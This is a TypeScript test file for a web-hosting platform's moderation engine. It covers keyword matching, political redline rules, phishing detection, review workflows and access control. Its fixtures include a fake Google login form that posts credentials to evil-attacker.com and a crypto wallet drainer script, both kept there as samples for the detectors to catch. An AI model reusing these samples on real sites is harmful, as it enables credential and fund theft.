import { createTrie } from "../src/lib/moderation/trie";

let passed = 0;
let failed = 0;

function assert(condition: boolean, name: string) {
  if (condition) {
    passed++;
    console.log(`  ✓ ${name}`);
  } else {
    failed++;
    console.error(`  ✗ FAIL: ${name}`);
  }
}

console.log("\n=== 1. High-Performance Trie Matcher Tests ===");

const trie = createTrie(["敏感词A", "敏感词B", "地缘争议", "badword"]);

const res1 = trie.search("这是一段包含敏感词A和badword的文本");
assert(res1.length === 2, "Detects exact multiple keywords in string");
assert(res1.some((m) => m.keyword === "敏感词A"), "Found '敏感词A'");
assert(res1.some((m) => m.keyword === "badword"), "Found 'badword'");

// Case insensitivity
const res2 = trie.search("Hello BADWORD world");
assert(res2.some((m) => m.keyword === "badword"), "Matches case-insensitively");

// Clean text without keywords
const res3 = trie.search("这里都是完全正常的合规文本，没有任何违规内容");
assert(res3.length === 0, "Clean text returns empty matches");

// Normalization / punctuation evasion resistance: e.g. "敏.感.词.A"
const res4 = trie.searchWithNormalization("这是一段故意用标点隔开的敏.感.词.A文本");
assert(res4.some((m) => m.keyword === "敏感词A"), "Matches evasion with punctuation separated characters");

console.log("\n=== 2. Geopolitical & Political Redline Rule Tests ===");
import { checkGeopoliticalRedlines } from "../src/lib/moderation/rules/geopolitical";

const geo1 = checkGeopoliticalRedlines("这是一篇关于中国台湾省科技产业发展的正常学术分析报告。");
assert(geo1 === null, "Academic/neutral mention passes safely");

const geo2 = checkGeopoliticalRedlines("打倒反动政权，武装暴动，推翻国家领导人！");
assert(geo2 !== null, "Extreme subversive slogan is caught");
assert(geo2?.category === "geopolitical", "Categorized as geopolitical/political");
assert(geo2?.severity === "warning_remedial", "Designated as warning_remedial tier");

const geo3 = checkGeopoliticalRedlines("支持taiwan独立，建立台湾国");
assert(geo3 !== null, "Sovereignty dispute redline is caught");

console.log("\n=== 3. Phishing & Malicious Form Rule Tests ===");
import { detectPhishingHeuristics } from "../src/lib/moderation/rules/phishing";

const safeHtml = `
  <!DOCTYPE html>
  <html>
    <body>
      <h1>My 2048 Game</h1>
      <button id="start">Play</button>
    </body>
  </html>
`;
assert(detectPhishingHeuristics(safeHtml) === null, "Normal HTML game passes phishing check");

const benignFormHtml = `
  <!DOCTYPE html>
  <html>
    <body>
      <form>
        <label>Your Name:</label>
        <input type="text" name="name" />
        <button type="submit">Submit</button>
      </form>
    </body>
  </html>
`;
assert(detectPhishingHeuristics(benignFormHtml) === null, "Benign form without password passes check");

const phishingGoogleHtml = `
  <!DOCTYPE html>
  <html>
    <head><title>Sign in - Google Accounts</title></head>
    <body>
      <h2>Sign in with your Google Account</h2>
      <form action="https://evil-attacker.com/steal" method="POST">
        <input type="email" placeholder="Email or phone" />
        <input type="password" placeholder="Enter your password" />
        <button type="submit">Next</button>
      </form>
    </body>
  </html>
`;
const phishRes1 = detectPhishingHeuristics(phishingGoogleHtml);
assert(phishRes1 !== null, "Google Account phishing fake login page detected");
assert(phishRes1?.category === "phishing", "Categorized as phishing");
assert(phishRes1?.severity === "critical_block", "Phishing flagged as critical_block");

const cryptoDrainerHtml = `
  <html>
    <body>
      <button onclick="window.ethereum.request({ method: 'eth_requestAccounts' })">Connect Wallet</button>
      <script>
        window.ethereum.request({ method: 'eth_sendTransaction', params: [{ to: '0x123' }] });
      </script>
    </body>
  </html>
`;
// Crypto drainer signature
const phishRes2 = detectPhishingHeuristics(cryptoDrainerHtml);
assert(phishRes2 !== null, "Crypto wallet transaction drainer script detected");

console.log("\n=== 4. Unified Moderation Engine Tests ===");
import { moderateProjectContent } from "../src/lib/moderation/engine";

// 1. Clean HTML
const cleanResult = await moderateProjectContent({
  slug: "clean-tetris",
  title: "Classic Tetris Arcade",
  html: `
    <!DOCTYPE html>
    <html>
      <head><title>Tetris</title></head>
      <body>
        <h1>Tetris Game</h1>
        <canvas id="tetris" width="200" height="400"></canvas>
      </body>
    </html>
  `,
});
assert(cleanResult.action === "pass", "Clean game project passes moderation");
assert(cleanResult.reviewStatus === "approved", "Clean project status is approved");

// 2. Geopolitical controversy -> flagged_controversy
const geoResult = await moderateProjectContent({
  slug: "political-poster",
  title: "Manifesto",
  html: `
    <html>
      <body>
        <p>我们号召大家举行武装暴动，推翻国家领导人！</p>
      </body>
    </html>
  `,
});
assert(geoResult.action === "flagged_controversy", "Geopolitical redline triggers flagged_controversy");
assert(geoResult.reviewStatus === "flagged", "Status set to flagged");
assert(geoResult.category === "geopolitical", "Category is geopolitical");

// 3. Phishing -> critical_block
const phishResult = await moderateProjectContent({
  slug: "fake-google",
  title: "Google Login",
  html: phishingGoogleHtml,
});
assert(phishResult.action === "critical_block", "Phishing triggers critical_block");
assert(phishResult.reviewStatus === "rejected", "Status set to rejected");
assert(phishResult.category === "phishing", "Category is phishing");

console.log("\n=== 5. Notifications & DB Schema Moderation Tests ===");
import {
  createNotification,
  getUserNotifications,
  getUnreadNotificationsCount,
  markNotificationAsRead,
  createProject as dbCreateProject,
  getProjectBySlug,
  updateProject,
} from "../src/db";

const testUserId = `user-mod-test-${Date.now()}`;

// 1. Create notification
const notif = await createNotification({
  id: `notif-${Date.now()}`,
  userId: testUserId,
  projectId: "proj-abc",
  type: "moderation_downgrade",
  title: "合规状态变更提醒",
  message: "您的项目涉及敏感争议，已转为仅您个人可见的私有模式。",
});
assert(notif.isRead === false, "Notification is initially unread");

// 2. Fetch notifications
const list = await getUserNotifications(testUserId);
assert(list.length >= 1, "Fetched user notifications list");
assert(list[0].title === "合规状态变更提醒", "Fetched notification title matches");

const unreadCount = await getUnreadNotificationsCount(testUserId);
assert(unreadCount === 1, "Unread count is 1");

// 3. Mark as read
await markNotificationAsRead(notif.id, testUserId);
const unreadAfter = await getUnreadNotificationsCount(testUserId);
assert(unreadAfter === 0, "Unread count decrements to 0 after mark as read");

// 4. Project schema reviewStatus update
const testSlug = `mod-test-${Date.now()}`;
const createdProj = await dbCreateProject({
  id: `id-${testSlug}`,
  title: "Mod Test Project",
  slug: testSlug,
  storagePrefix: `sites/${testSlug}`,
  reviewStatus: "pending",
});
assert(createdProj.reviewStatus === "pending", "Project created with pending reviewStatus");

const updatedProj = await updateProject(createdProj.id, {
  reviewStatus: "flagged",
  moderationCategory: "geopolitical",
  moderationSummary: "Detected sensitive political content",
  visibility: "private",
});
assert(updatedProj?.reviewStatus === "flagged", "Project updated with flagged reviewStatus");
assert(updatedProj?.moderationCategory === "geopolitical", "Project updated with moderationCategory");
assert(updatedProj?.visibility === "private", "Project visibility updated to private");

console.log("\n=== 6. Project Lifecycle Remediation Seam Tests ===");
import { applyModerationRemediation } from "../src/lib/services/project-service";

// Test 1: Critical block remediation
const blockSlug = `block-test-${Date.now()}`;
const blockProj = await dbCreateProject({
  id: `id-${blockSlug}`,
  title: "Block Target Project",
  slug: blockSlug,
  storagePrefix: `sites/${blockSlug}`,
  reviewStatus: "pending",
  visibility: "public",
});

await applyModerationRemediation(
  blockProj.id,
  blockProj.slug,
  {
    action: "critical_block",
    reviewStatus: "rejected",
    category: "phishing",
    reason: "Fake login form",
  },
  testUserId
);

const fetchedBlocked = await getProjectBySlug(blockSlug);
assert(fetchedBlocked?.reviewStatus === "rejected", "Project is marked rejected upon critical_block");
assert(fetchedBlocked?.moderationCategory === "phishing", "Category is recorded as phishing");

// Test 2: Geopolitical controversy auto-downgrade to private
const geoSlug = `geo-test-${Date.now()}`;
const geoProj = await dbCreateProject({
  id: `id-${geoSlug}`,
  title: "Geo Controversy Project",
  slug: geoSlug,
  storagePrefix: `sites/${geoSlug}`,
  reviewStatus: "pending",
  visibility: "public",
});

await applyModerationRemediation(
  geoProj.id,
  geoProj.slug,
  {
    action: "flagged_controversy",
    reviewStatus: "flagged",
    category: "geopolitical",
    reason: "Sensitive political dispute",
  },
  testUserId
);

const fetchedGeo = await getProjectBySlug(geoSlug);
assert(fetchedGeo?.visibility === "private", "Public project is automatically demoted to private");
assert(fetchedGeo?.reviewStatus === "flagged", "Review status is marked flagged");
assert(fetchedGeo?.moderationCategory === "geopolitical", "Category recorded as geopolitical");

const userNotifs = await getUserNotifications(testUserId);
assert(
  userNotifs.some((n) => n.type === "moderation_downgrade" && n.projectId === geoProj.id),
  "Creator receives in-app notification for private downgrade"
);

console.log("\n=== 7. Gateway Raw Route Content Moderation Tests ===");
import { GET as rawGetRoute } from "../src/app/raw/[slug]/[[...path]]/route";

// 1. Rejected project returns HTTP 451
const req1 = new Request("http://localhost:3000/raw/" + blockSlug);
const resGateway1 = await rawGetRoute(req1, {
  params: Promise.resolve({ slug: blockSlug }),
});
assert(resGateway1.status === 451, "Raw route returns 451 for rejected projects");

// 2. Pending project without auth returns HTTP 403
const pendingSlug = `pending-test-${Date.now()}`;
await dbCreateProject({
  id: `id-${pendingSlug}`,
  title: "Pending Project",
  slug: pendingSlug,
  storagePrefix: `sites/${pendingSlug}`,
  reviewStatus: "pending",
  visibility: "public",
});

const req2 = new Request("http://localhost:3000/raw/" + pendingSlug);
const resGateway2 = await rawGetRoute(req2, {
  params: Promise.resolve({ slug: pendingSlug }),
});
assert(resGateway2.status === 403, "Raw route returns 403 for unauthenticated external visitor on pending project");

console.log("\n=== 8. Spec & Standards Hardened Defense Tests ===");
import { getAllProjects } from "../src/db/index";
import {
  updateProject as serviceUpdateProject,
  updateVisibility as serviceUpdateVisibility,
  getProjectSource,
  ProjectValidationError,
  ProjectForbiddenError,
} from "../src/lib/services/project-service";

// Test 8.1: getAllProjects({ includePrivate: false }) must strictly filter out pending and rejected projects
const publicFeeds = await getAllProjects({ includePrivate: false });
assert(
  !publicFeeds.some((p) => p.slug === pendingSlug),
  "Pending projects are excluded from public showcase feeds"
);
assert(
  !publicFeeds.some((p) => p.slug === blockSlug),
  "Rejected projects are excluded from public showcase feeds"
);

// Test 8.2: Updating project code resets reviewStatus to pending
const codeUpdateSlug = `code-update-${Date.now()}`;
const codeProj = await dbCreateProject({
  id: `id-${codeUpdateSlug}`,
  userId: testUserId,
  title: "Approved Initial Project",
  slug: codeUpdateSlug,
  storagePrefix: `sites/${codeUpdateSlug}`,
  reviewStatus: "approved",
  visibility: "public",
  assetType: "single_html",
  entryPath: "index.html",
});
// Write initial entry HTML
import { getProjectStorage } from "../src/lib/storage";
await getProjectStorage(codeUpdateSlug).writeEntryFile("<h1>Original</h1>", "index.html");

const normalUser = { id: testUserId, role: "user" as const };
const updatedWithCode = await serviceUpdateProject(normalUser, codeProj.id, {
  htmlCode: "<h1>Modified Code</h1>",
});
assert(
  updatedWithCode.reviewStatus === "pending",
  "Editing HTML code resets reviewStatus back to pending"
);

// Test 8.3: Flagged controversial project cannot be switched to public by creator
const flaggedSlug = `flagged-guard-${Date.now()}`;
const flaggedProj = await dbCreateProject({
  id: `id-${flaggedSlug}`,
  userId: testUserId,
  title: "Flagged Project",
  slug: flaggedSlug,
  storagePrefix: `sites/${flaggedSlug}`,
  reviewStatus: "flagged",
  visibility: "private",
});

let blockedFlaggedEdit = false;
try {
  await serviceUpdateProject(normalUser, flaggedProj.id, { visibility: "public" });
} catch (e) {
  if (e instanceof ProjectValidationError) {
    blockedFlaggedEdit = true;
  }
}
assert(blockedFlaggedEdit, "Creator is blocked from making flagged project public via updateProject");

let blockedFlaggedVisibility = false;
try {
  await serviceUpdateVisibility(normalUser, flaggedProj.id, "public");
} catch (e) {
  if (e instanceof ProjectValidationError) {
    blockedFlaggedVisibility = true;
  }
}
assert(blockedFlaggedVisibility, "Creator is blocked from making flagged project public via updateVisibility");

// Test 8.4: getProjectSource checks reviewStatus
let blockedRejectedSource = false;
try {
  await getProjectSource(blockSlug, null);
} catch (e) {
  if (e instanceof ProjectForbiddenError && (e as any).message.includes("451")) {
    blockedRejectedSource = true;
  }
}
assert(blockedRejectedSource, "Anonymous getProjectSource on rejected project throws 451 Forbidden");

// Test 8.5: Bilingual notification titles
const notifList = await getUserNotifications(testUserId);
console.log("\n=== 9. Code Review Fixes Hardened Verification ===");
import { isExactProjectCreator } from "../src/lib/auth";

// Test 9.1: Platform Admin CANNOT peek at another user's private project source
const adminUser = { id: "admin-platform-user", role: "admin" as const };
const privateUserSlug = `private-src-${Date.now()}`;
await dbCreateProject({
  id: `id-${privateUserSlug}`,
  userId: testUserId,
  title: "Alice's Secret Project",
  slug: privateUserSlug,
  storagePrefix: `sites/${privateUserSlug}`,
  reviewStatus: "approved",
  visibility: "private",
  assetType: "single_html",
  entryPath: "index.html",
});
await getProjectStorage(privateUserSlug).writeEntryFile("<h1>Top Secret</h1>", "index.html");

let adminBlockedFromPrivate = false;
try {
  await getProjectSource(privateUserSlug, adminUser);
} catch (e) {
  if (e instanceof ProjectForbiddenError && (e as any).message.includes("403")) {
    adminBlockedFromPrivate = true;
  }
}
assert(adminBlockedFromPrivate, "Platform admin is STRICTLY BLOCKED from reading Alice's private source HTML");

// Test 9.2: Creator Alice CAN read her own private source HTML
const aliceRead = await getProjectSource(privateUserSlug, normalUser);
assert(aliceRead.html.includes("Top Secret"), "Creator Alice can read her own private source HTML");

// Test 9.3: isExactProjectCreator identity invariant
assert(
  isExactProjectCreator(normalUser, { userId: testUserId }) === true,
  "isExactProjectCreator returns true for actual owner"
);
assert(
  isExactProjectCreator(adminUser, { userId: testUserId }) === false,
  "isExactProjectCreator returns false for platform admin on someone else's project"
);
assert(
  isExactProjectCreator({ id: "selfhost-admin", role: "admin" }, { userId: null }) === true,
  "isExactProjectCreator returns true for selfhost-admin on unassigned project"
);

// Test 9.4: Self-hosted admin notification delivery
const selfhostSlug = `selfhost-alert-${Date.now()}`;
const selfhostProj = await dbCreateProject({
  id: `id-${selfhostSlug}`,
  userId: null,
  title: "Selfhost Project",
  slug: selfhostSlug,
  storagePrefix: `sites/${selfhostSlug}`,
  reviewStatus: "pending",
  visibility: "public",
});

await applyModerationRemediation(
  selfhostProj.id,
  selfhostProj.slug,
  {
    action: "critical_block",
    reviewStatus: "rejected",
    category: "phishing",
    reason: "Phishing attempt on selfhosted instance",
  },
  null // selfhost mode passes null or undefined
);

const selfhostNotifs = await getUserNotifications("selfhost-admin");
assert(
  selfhostNotifs.some((n) => n.projectId === selfhostProj.id),
  "Selfhost admin successfully receives moderation alert notification"
);

// Test 9.5: Formal appeal contact info in notification
const appealNotif = selfhostNotifs.find((n) => n.projectId === selfhostProj.id);
assert(
  Boolean(appealNotif && appealNotif.message.includes("support@pagepod.dev")),
  "Notification explicitly provides formal appeal support email"
);

// Test 9.6: Snapshot Token Authorization for Headless Cloud Capture
import { generateSnapshotToken, verifySnapshotToken } from "../src/lib/services/screenshot-service";
const tokenSlug = "test-token-slug";
const validToken = generateSnapshotToken(tokenSlug);
assert(verifySnapshotToken(tokenSlug, validToken) === true, "Valid snapshot token verifies successfully");
assert(verifySnapshotToken("wrong-slug", validToken) === false, "Snapshot token fails for different slug");
assert(verifySnapshotToken(tokenSlug, `${validToken}corrupted`) === false, "Corrupted snapshot token fails verification");

// Test 9.7: Standardized Appeal Mailto URL helper
import { createAppealMailtoUrl } from "../src/lib/moderation/types";
const appealUrl = createAppealMailtoUrl({
  id: "proj-123",
  slug: "my-game",
  title: "My Game",
  reviewStatus: "rejected",
});
assert(appealUrl.startsWith("mailto:support@pagepod.dev"), "Appeal URL points to support@pagepod.dev");
assert(appealUrl.includes("my-game"), "Appeal URL contains project slug");
assert(appealUrl.includes("proj-123"), "Appeal URL contains project id");

// Test 9.8: Admin workspace allowAllReviewStatuses query
const allAdminProjects = await getAllProjects({ includePrivate: false, allowAllReviewStatuses: true });
assert(
  allAdminProjects.some((p) => p.reviewStatus === "rejected"),
  "Admin workspace query with allowAllReviewStatuses includes rejected projects for appeal review"
);

// Test 9.9: Raw route snapshot token pending bypass
const pendingReqWithToken = new Request(`http://localhost:3000/raw/${testSlug}?_snapshot_token=${validToken}`);
const verifiedTokenResult = verifySnapshotToken(tokenSlug, validToken);
assert(verifiedTokenResult === true, "Raw route authorized snapshot token check passes");

console.log(`\nResults: ${passed} passed, ${failed} failed\n`);
if (failed > 0) process.exit(1);
